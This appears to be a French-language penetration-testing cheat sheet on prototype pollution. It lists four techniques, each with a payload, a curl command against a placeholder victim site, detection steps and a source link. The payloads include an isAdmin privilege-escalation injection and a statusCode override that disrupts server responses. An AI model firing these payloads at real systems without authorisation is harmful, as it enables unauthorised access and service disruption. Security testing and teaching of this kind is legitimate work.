# Prototype pollution

1. Pollution du prototype via JSON (server-side)  
   - Payload d’attaque neutre : `{ "__proto__": { "polluted": "yes" } }`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '{"__proto__": {"polluted":"yes"}}' https://site-victime.net/api  
   - Commande d’analyse : Envoyer une requête normale (ex : curl https://site-victime.net/api/info) et observer si la propriété `polluted` apparaît ou modifie le comportement  
   - Élément d’analyse : Vérifier si la propriété injectée est accessible sur des objets nouvellement créés, indiquant une pollution globale du prototype  
   - Méthodologie : Injecter un champ `__proto__` dans un body JSON, puis observer un changement persistant de comportement sur d’autres fonctionnalités ou réponses  
   - Source : https://portswigger.net/web-security/prototype-pollution/server-side

2. Pollution du prototype via paramètres d’URL  
   - Payload d’attaque neutre : `?__proto__[isAdmin]=true`  
   - Commande d’attaque : curl "https://site-victime.net/profile?__proto__[isAdmin]=true"  
   - Commande d’analyse : Accéder à une fonctionnalité sensible (ex : /admin) ou observer si la réponse indique un changement de droits ou de comportement  
   - Élément d’analyse : Vérifier si la propriété injectée via l’URL affecte tous les objets, par exemple en accordant un accès admin sans authentification  
   - Méthodologie : Injecter des paramètres `__proto__` dans l’URL, puis tester les fonctionnalités sensibles ou observer les changements dans les réponses ou privilèges  
   - Source : https://portswigger.net/web-security/prototype-pollution

3. Pollution du prototype via propriétés alternatives  
   - Payload d’attaque neutre : `{ "constructor": { "prototype": { "polluted": 1 } } }`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"polluted":1}}}' https://site-victime.net/api  
   - Commande d’analyse : Vérifier via une fonctionnalité utilisant un objet nouvellement créé si la propriété `polluted` est accessible ou modifie le résultat  
   - Élément d’analyse : Tester si la pollution fonctionne aussi via `constructor.prototype`, contournant parfois les protections sur `__proto__`  
   - Méthodologie : Injecter différentes syntaxes (`__proto__`, `constructor.prototype`, etc.), puis observer les effets sur les objets ou le comportement de l’application  
   - Source : https://swisskyrepo.github.io/PayloadsAllTheThings/Prototype%20Pollution/

4. Pollution du prototype pour modifier le comportement serveur  
   - Payload d’attaque neutre : `{ "__proto__": { "statusCode": 404 } }`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"statusCode":404}}' https://site-victime.net/api  
   - Commande d’analyse : Observer si toutes les réponses HTTP suivantes retournent un code 404 ou un comportement anormal  
   - Élément d’analyse : Détecter un changement global de configuration ou de comportement serveur suite à l’injection  
   - Méthodologie : Injecter des propriétés correspondant à des options serveur ou valeurs de configuration, puis observer si le serveur adopte un comportement modifié globalement  
   - Source : https://www.vaadata.com/blog/what-is-prototype-pollution-exploitations-and-security-tips/

---
